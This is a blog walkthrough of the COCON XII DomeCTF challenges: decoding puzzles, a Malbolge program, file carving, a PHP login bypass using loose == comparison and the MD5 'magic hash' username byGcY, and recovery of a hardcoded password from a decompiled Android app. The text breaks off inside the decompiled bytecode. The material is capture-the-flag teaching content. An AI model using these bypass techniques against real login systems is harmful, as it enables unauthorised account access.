<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>COCON XII DOME CTF Walkthrough - Rahul R</title>
<meta name="description" content="This is the walkthrough for the challenges that were provided as a part of COCON’s DomeCTF">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Rahul R">
<meta property="og:title" content="COCON XII DOME CTF Walkthrough">
<meta property="og:url" content="http://localhost:4000/C0C0N-XII-CTF-Walkthrough/">


  <meta property="og:description" content="This is the walkthrough for the challenges that were provided as a part of COCON’s DomeCTF">



  <meta property="og:image" content="http://localhost:4000/assets/images/cocon-xii-ctf/logo.png">





  <meta property="article:published_time" content="2019-10-02T00:00:00+05:30">





  

  


<link rel="canonical" href="http://localhost:4000/C0C0N-XII-CTF-Walkthrough/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "Rahul R",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Rahul R Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-6FTHS5L22F"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-6FTHS5L22F');
</script>
<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">COCON XII DOME CTF Walkthrough</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="Rahul R" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Rahul R</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, CTF player<br>SOC guy
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">India</span>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://twitter.com/Rahul_R95" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
          </a>
        </li>
      

      
        <li>
          <a href="https://www.facebook.com/rahul.raveendran.92351" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-facebook-square" aria-hidden="true"></i> Facebook
          </a>
        </li>
      

      

      
        <li>
          <a href="https://www.linkedin.com/in/rahul-r-3b0433a6" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/rahulr311295" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="COCON XII DOME CTF Walkthrough">
    <meta itemprop="description" content="This is the walkthrough for the challenges that were provided as a part of COCON’s DomeCTF">
    <meta itemprop="datePublished" content="October 02, 2019">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">COCON XII DOME CTF Walkthrough
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-10-02T00:00:00+05:30">October 02, 2019 </time>&emsp;
          
          
        </p>
        <p>Before we start reading can we just admire the Badge that was given as a part of DOME CTF.</p>

<p><img src="/assets/images/cocon-xii-ctf/badge.png" alt="" /></p>

<p><img src="/assets/images/cocon-xii-ctf/australia.png" alt="" /></p>

<p>In this challenge, we were given a message.txt file that contained a long base64 string when decoded gives out a string that is either reversed or encrypted with rot13 by recursively decoding this message and at the end, the flag is displayed.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>domectf{T5EN7Uxp7KjluznduX8tmXlhc5lX0qHH}
</code></pre></div></div>
<p><img src="/assets/images/cocon-xii-ctf/botswana.png" alt="" />
In this challenge as the challenge, the description says to read the rules page that was given at the time of registration. On that page, there was a QR code when scanned spits out a link to a gist snippet.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://gist.githubusercontent.com/anees264/90af6d6e6b80c65b18a15e7c0dd769bd/raw/eb0bdcbf19368d9dc4ed66450816ca4314e88dd4/the_rules.txt
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'CB;_9&gt;7&lt;;43Wxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCB^]\[ZYXW
VUTMqQPON0Fj-IHG@d'&amp;%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMc
bgf_dcb[`_X|?&gt;=&lt;;:9876543210/.-CHG@EDCBA@9]~}|{zyxwvutsrqponmlkjihgfedcba`_^
]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)('&amp;%$#"!~}|{zyxwvutsrqp
onmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;W9OTMRQPONMLKDh+*)('&amp;%$
#"!~}|{zyxwvutsrqp.-,+k)('&amp;}|{Aba`_^]\[ZYXWVUTSRQPONMLhgfedcba`YAW{[ZYXWPUTM
q43210/.-,+*)('&amp;%$#?&gt;~&lt;;492765.Rsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIH
GFEDCBA@?&gt;Z&lt;XWPOTSRQPOHlLK-CHG@?c&amp;%$#"!~}|{zyxwvutsr0/.-,+*)(h&amp;}Cdcba`_^]\[Z
YXWVUTSihmlkjihgfe^$EDCBA@\[ZYXW9OTSLp3210/.-,+*)('&amp;%$#"&gt;~&lt;5:927654-Qrqponm+
*#"'&amp;%$#"y?`|{zyxq7XWVUTSRQPONMLKJIHGFEa`_^]\[ZYRWPtT6Lp3INMLEi,+*)('=BA@?&gt;=
&lt;;:3W765432r0)Mn&amp;%*#Ghgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:98765432
10/.-,+*)('&amp;%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFED
CBA@?&gt;=&lt;;:9876543210/.-,+*)('&amp;%$@?8=&lt;5:98765.Rsrqpon,l$)('~%$#z@x}|{zyxq7Xtm
3Tpoh.ONMLKJ`e^cba`_^]Vz=&lt;;:9876543210/.-,+*)(DCBA@?&gt;=&lt;|{3Wxwvutsrqponmlkjih
gfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)('&amp;%$#"!~}|{z
yxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:98765QPON0LK
JIHGFE&gt;b&lt;;@?&gt;=&lt;54Xyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFED`_^]
?[ZYXWVUNr543210/.-,+*)('&amp;%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSR
QPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)('&amp;%$#"!~}|{zyxwvutsrqponmlkjihgfed
cba`_^]\[ZYXWVUTSRQPlNdchgfedcba`Y}@\UZYXWVOs6543210/.-,+*)('&amp;%A@?!7&lt;;:9870T
utsrqp.-,+k)('&amp;%|Bcba`_^]\[ZYXWVUTSRnmlkjihJfed]#n
</code></pre></div></div>
<p>Which is Malbolge an esoteric programming language we can use an interpreter to get the output of the program?</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>domectf{VknClfWQ4AK6Oo3L0PkC1WCiDgqrO1HW}
</code></pre></div></div>
<p><img src="/assets/images/cocon-xii-ctf/brazil.png" alt="" /></p>

<p>In this challenge, we are provided with a file called d0me by running the file command over it we can see that the file is a boot partition.</p>

<p><img src="/assets/images/cocon-xii-ctf/brazil1.png" alt="" /></p>

<p>At first, we tried many stupid things but failed miserably when we ran the foremost against the file it gave a png image which was the flag to that challenge.</p>

<p><img src="/assets/images/cocon-xii-ctf/brazil2.png" alt="" /></p>

<p><img src="/assets/images/cocon-xii-ctf/flag1.png" alt="" /></p>

<p><img src="/assets/images/cocon-xii-ctf/congo.png" alt="" /></p>

<p>In this challenge, we have a login page and nothing else.</p>

<p><img src="/assets/images/cocon-xii-ctf/congo_login.png" alt="" /></p>

<p>By doing a directory bruteforcing on the server we got a backup directory that contained a zip file.
   <img src="/assets/images/cocon-xii-ctf/congo_dir.png" alt="" /></p>

<p><img src="/assets/images/cocon-xii-ctf/congo_backup.png" alt="" /></p>

<p>After extracting the zip file there were 4 files.
    <img src="/assets/images/cocon-xii-ctf/congo_files.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>index.php
</code></pre></div></div>
<p><img src="/assets/images/cocon-xii-ctf/congo_index.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>functions.php
</code></pre></div></div>
<p><img src="/assets/images/cocon-xii-ctf/congo_functions.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>register.php
</code></pre></div></div>
<p><img src="/assets/images/cocon-xii-ctf/congo_register.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> users.dat
</code></pre></div></div>
<p><img src="/assets/images/cocon-xii-ctf/congo_users.png" alt="" /></p>

<p>So, when adding a user, the username is md5 hashed and the  password is base64 encoded then appended to the password database file. When retrieving the user details, the md5 of the supplied username to test is checked against the md5 hashed value in the password database.So where is the vulnerability then as you can see in the index.php file if user_info[1] == pw . The application is using == operator to check if user_info and pw is true if then print the flag. When it comes to using == in a login fuction that can only mean one thing PHP Type Juggling.So if we can find an existing user with a username that gets hashed to something that looks like <strong>0e004561083131340065739640281486</strong> we can use that to bypass the login function.</p>

<p>So lets see if we can find any username in the users.dat file whose md5 sum starts with 0e and there was one username adm2salwg .Now we need to generate a username whose md5 sum equals to 0e and we can use byGcY whose md5 sum starts with 0e to get the password of adm2salwg user we can register a new user with the username as byGcY and a random password when we register as the user the password of adm2salwg is displayed which can be used to login as adm2salwg which displays the flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>domectf{RhNI4AZ2bPCl8s0AdBs9HUhM1ggLov3n}
</code></pre></div></div>

<p><img src="/assets/images/cocon-xii-ctf/US.png" alt="" /></p>

<p>In this challenge we are given an android application when installed asks us permissions to access the camera when we grant access to it a scanner pops up which says identify yourself we started by scanning faces and objects but it returned as an invalid scan we had a QR code on our COCON ID cards which we scanned next which was successful and gave us a login page for which we didn’t have any credentials so we started decompiling the app. After decompilation, we found a file called login.class which has a password hardcoded to it.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="n">login</span> <span class="kd">extends</span> <span class="n">android</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="nc">Activity</span> <span class="o">{</span>
     

     <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="no">PERMS_REQUEST_CODE</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Integer</span><span class="o">);</span>
     <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="nc">RequestPermissionCode</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Integer</span><span class="o">);</span>
     <span class="kd">private</span> <span class="n">android</span><span class="o">.</span><span class="na">widget</span><span class="o">.</span><span class="na">EditText</span> <span class="n">email</span><span class="o">;</span>
     <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">password</span><span class="o">;</span>
     <span class="kd">private</span> <span class="n">android</span><span class="o">.</span><span class="na">widget</span><span class="o">.</span><span class="na">EditText</span> <span class="n">passwrod</span><span class="o">;</span>

     <span class="kd">public</span> <span class="nf">login</span><span class="o">()</span> <span class="o">{</span> <span class="c1">//  //()V</span>
             <span class="n">aload0</span> <span class="c1">// reference to self</span>
             <span class="n">invokespecial</span> <span class="n">android</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="nc">Activity</span><span class="o">.()</span><span class="no">V</span>
             <span class="n">aload0</span> <span class="c1">// reference to self</span>
             <span class="n">ldc</span> <span class="s">"dGVzdHBhc3N3b3Jk"</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
             <span class="n">putfield</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="n">login</span><span class="o">.</span><span class="na">password</span><span class="o">:</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span>
             <span class="k">return</span>
     <span class="o">}</span>
</code></pre></div></div>

<p>It was a base64 string when decoded gives testpassword. We logged in using the email as admin@domectf.com and the password that we got from the source code. After logging in to the application we have a key and a picture of a lock in the background when we start to rotate the phone the key also rotates so it had something to do with the accelerometer and gyroscope sensors also the application toasts a position vector after further analysis of the source code we came to a conclusion that in order to open the lock we had to rotate the X axis of the phone to a value between 27 and 35 and hold it for 15 seconds by doing these the screen changes and displays the flag.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="nf">startTimer</span><span class="o">()</span> <span class="o">{</span> <span class="c1">//()V</span>
             <span class="n">aload0</span> <span class="c1">// reference to self</span>
             <span class="n">getfield</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">.</span><span class="na">cTimer</span><span class="o">:</span><span class="n">android</span><span class="o">.</span><span class="na">os</span><span class="o">.</span><span class="na">CountDownTimer</span>
             <span class="n">ifnonnull</span> <span class="no">L1</span>
             <span class="n">aload0</span> <span class="c1">// reference to self</span>
             <span class="k">new</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="err">$</span><span class="mi">1</span>
             <span class="n">dup</span>
             <span class="n">aload0</span> <span class="c1">// reference to self</span>
             <span class="n">ldc</span> <span class="mi">15000</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Long</span><span class="o">)</span><span class="c1">//Time 15 seconds</span>
             <span class="n">ldc</span> <span class="mi">1000</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Long</span><span class="o">)</span>
             <span class="n">invokespecial</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="err">$</span><span class="mi">1</span><span class="o">.(</span><span class="nc">Lcom</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">;</span><span class="no">JJ</span><span class="o">)</span><span class="no">V</span>
             <span class="n">putfield</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">.</span><span class="na">cTimer</span><span class="o">:</span><span class="n">android</span><span class="o">.</span><span class="na">os</span><span class="o">.</span><span class="na">CountDownTimer</span>
             <span class="n">aload0</span> <span class="c1">// reference to self</span>
             <span class="n">getfield</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">.</span><span class="na">cTimer</span><span class="o">:</span><span class="n">android</span><span class="o">.</span><span class="na">os</span><span class="o">.</span><span class="na">CountDownTimer</span>
             <span class="n">invokevirtual</span> <span class="n">android</span><span class="o">/</span><span class="n">os</span><span class="o">/</span><span class="nc">CountDownTimer</span><span class="o">.</span><span class="na">start</span><span class="o">()</span><span class="nc">Landroid</span><span class="o">/</span><span class="n">os</span><span class="o">/</span><span class="nc">CountDownTimer</span><span class="o">;</span>
             <span class="n">pop</span>
         <span class="no">L1</span> <span class="o">{</span>
             <span class="k">return</span>
         <span class="o">}</span>
     <span class="o">}</span>
 <span class="kd">public</span> <span class="nf">onFinish</span><span class="o">()</span> <span class="o">{</span> <span class="c1">//()V</span>
                  <span class="n">aload0</span> <span class="c1">// reference to self</span>
                  <span class="n">getfield</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="err">$</span><span class="mi">1</span><span class="o">.</span><span class="na">this</span><span class="err">$</span><span class="mi">0</span><span class="o">:</span><span class="n">com</span><span class="o">.</span><span class="na">example</span><span class="o">.</span><span class="na">unlockme</span><span class="o">.</span><span class="na">Internal</span>
                  <span class="n">getfield</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">.</span><span class="na">z</span><span class="o">:</span><span class="kt">float</span>
                  <span class="n">ldc</span> <span class="mf">27.0</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Float</span><span class="o">)</span> <span class="c1">// X axis Value</span>
                  <span class="n">fcmpl</span>
                  <span class="n">ifle</span> <span class="no">L1</span>
                  <span class="n">aload0</span> <span class="c1">// reference to self</span>
                  <span class="n">getfield</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="err">$</span><span class="mi">1</span><span class="o">.</span><span class="na">this</span><span class="err">$</span><span class="mi">0</span><span class="o">:</span><span class="n">com</span><span class="o">.</span><span class="na">example</span><span class="o">.</span><span class="na">unlockme</span><span class="o">.</span><span class="na">Internal</span>
                  <span class="n">getfield</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">.</span><span class="na">z</span><span class="o">:</span><span class="kt">float</span>
                  <span class="n">ldc</span> <span class="mf">35.0</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Float</span><span class="o">)</span> <span class="c1">//X axis value</span>
                  <span class="n">fcmpg</span>
                  <span class="n">ifge</span> <span class="no">L1</span>
                  <span class="n">aload0</span> <span class="c1">// reference to self</span>
                  <span class="n">getfield</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="err">$</span><span class="mi">1</span><span class="o">.</span><span class="na">this</span><span class="err">$</span><span class="mi">0</span><span class="o">:</span><span class="n">com</span><span class="o">.</span><span class="na">example</span><span class="o">.</span><span class="na">unlockme</span><span class="o">.</span><span class="na">Internal</span>
                  <span class="n">invokestatic</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">.</span><span class="na">access</span><span class="err">$</span><span class="mo">000</span><span class="o">(</span><span class="nc">Lcom</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">;)</span><span class="nc">Landroid</span><span class="o">/</span><span class="n">widget</span><span class="o">/</span><span class="nc">LinearLayout</span><span class="o">;</span>
                  <span class="n">ldc</span> <span class="mi">2131165320</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Integer</span><span class="o">)</span>
                  <span class="n">invokevirtual</span> <span class="n">android</span><span class="o">/</span><span class="n">widget</span><span class="o">/</span><span class="nc">LinearLayout</span><span class="o">.</span><span class="na">setBackgroundResource</span><span class="o">(</span><span class="no">I</span><span class="o">)</span><span class="no">V</span>
                  <span class="n">aload0</span> <span class="c1">// reference to self</span>
                  <span class="n">getfield</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="err">$</span><span class="mi">1</span><span class="o">.</span><span class="na">this</span><span class="err">$</span><span class="mi">0</span><span class="o">:</span><span class="n">com</span><span class="o">.</span><span class="na">example</span><span class="o">.</span><span class="na">unlockme</span><span class="o">.</span><span class="na">Internal</span>
                  <span class="n">invokestatic</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">.</span><span class="na">access</span><span class="err">$</span><span class="mi">100</span><span class="o">(</span><span class="nc">Lcom</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">;)</span><span class="nc">Landroid</span><span class="o">/</span><span class="n">widget</span><span class="o">/</span><span class="nc">LinearLayout</span><span class="o">;</span>
                  <span class="n">bipush</span> <span class="mi">8</span>
                  <span class="n">invokevirtual</span> <span class="n">android</span><span class="o">/</span><span class="n">widget</span><span class="o">/</span><span class="nc">LinearLayout</span><span class="o">.</span><span class="na">setVisibility</span><span class="o">(</span><span class="no">I</span><span class="o">)</span><span class="no">V</span>
                  <span class="n">aload0</span> <span class="c1">// reference to self</span>
                  <span class="n">getfield</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="err">$</span><span class="mi">1</span><span class="o">.</span><span class="na">this</span><span class="err">$</span><span class="mi">0</span><span class="o">:</span><span class="n">com</span><span class="o">.</span><span class="na">example</span><span class="o">.</span><span class="na">unlockme</span><span class="o">.</span><span class="na">Internal</span>
                  <span class="n">invokestatic</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">.</span><span class="na">access</span><span class="err">$</span><span class="mi">200</span><span class="o">(</span><span class="nc">Lcom</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">;)</span><span class="nc">Landroid</span><span class="o">/</span><span class="n">widget</span><span class="o">/</span><span class="nc">LinearLayout</span><span class="o">;</span>
                  <span class="n">iconst_0</span>
                  <span class="n">invokevirtual</span> <span class="n">android</span><span class="o">/</span><span class="n">widget</span><span class="o">/</span><span class="nc">LinearLayout</span><span class="o">.</span><span class="na">setVisibility</span><span class="o">(</span><span class="no">I</span><span class="o">)</span><span class="no">V</span>
                  <span class="n">aload0</span> <span class="c1">// reference to self</span>
                  <span class="n">getfield</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="err">$</span><span class="mi">1</span><span class="o">.</span><span class="na">this</span><span class="err">$</span><span class="mi">0</span><span class="o">:</span><span class="n">com</span><span class="o">.</span><span class="na">example</span><span class="o">.</span><span class="na">unlockme</span><span class="o">.</span><span class="na">Internal</span>
                  <span class="n">invokestatic</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">.</span><span class="na">access</span><span class="err">$</span><span class="mi">300</span><span class="o">(</span><span class="nc">Lcom</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">;)</span><span class="nc">Landroid</span><span class="o">/</span><span class="n">widget</span><span class="o">/</span><span class="nc">TextView</span><span class="o">;</span>
                  <span class="n">iconst_0</span>
                  <span class="n">invokevirtual</span> <span class="n">android</span><span class="o">/</span><span class="n">widget</span><span class="o">/</span><span class="nc">TextView</span><span class="o">.</span><span class="na">setVisibility</span><span class="o">(</span><span class="no">I</span><span class="o">)</span><span class="no">V</span>
                  <span class="n">aload0</span> <span class="c1">// reference to self</span>
                  <span class="n">getfield</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="err">$</span><span class="mi">1</span><span class="o">.</span><span class="na">this</span><span class="err">$</span><span class="mi">0</span><span class="o">:</span><span class="n">com</span><span class="o">.</span><span class="na">example</span><span class="o">.</span><span class="na">unlockme</span><span class="o">.</span><span class="na">Internal</span>
                  <span class="n">invokestatic</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">.</span><span class="na">access</span><span class="err">$</span><span class="mi">300</span><span class="o">(</span><span class="nc">Lcom</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">;)</span><span class="nc">Landroid</span><span class="o">/</span><span class="n">widget</span><span class="o">/</span><span class="nc">TextView</span><span class="o">;</span>
                  <span class="n">aload0</span> <span class="c1">// reference to self</span>
                  <span class="n">getfield</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="err">$</span><span class="mi">1</span><span class="o">.</span><span class="na">this</span><span class="err">$</span><span class="mi">0</span><span class="o">:</span><span class="n">com</span><span class="o">.</span><span class="na">example</span><span class="o">.</span><span class="na">unlockme</span><span class="o">.</span><span class="na">Internal</span>
                  <span class="n">invokevirtual</span> <span class="n">com</span><span class="o">/</span><span class="n">example</span><span class="o">/</span><span class="n">unlockme</span><span class="o">/</span><span class="nc">Internal</span><span class="o">.</span><span class="na">stringFromJNI</span><span class="o">()</span><span class="nc">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="nc">String</span><span class="o">;</span>
                  <span class="n">invokevirtual</span> <span class="n">android</span><span class="o">/</span><span class="n">widget</span><span class="o">/</span><span class="nc">TextView</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="nc">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="nc">CharSequence</span><span class="o">;)</span><span class="no">V</span>
              <span class="no">L1</span> <span class="o">{</span>
                  <span class="k">return</span>
              <span class="o">}</span>
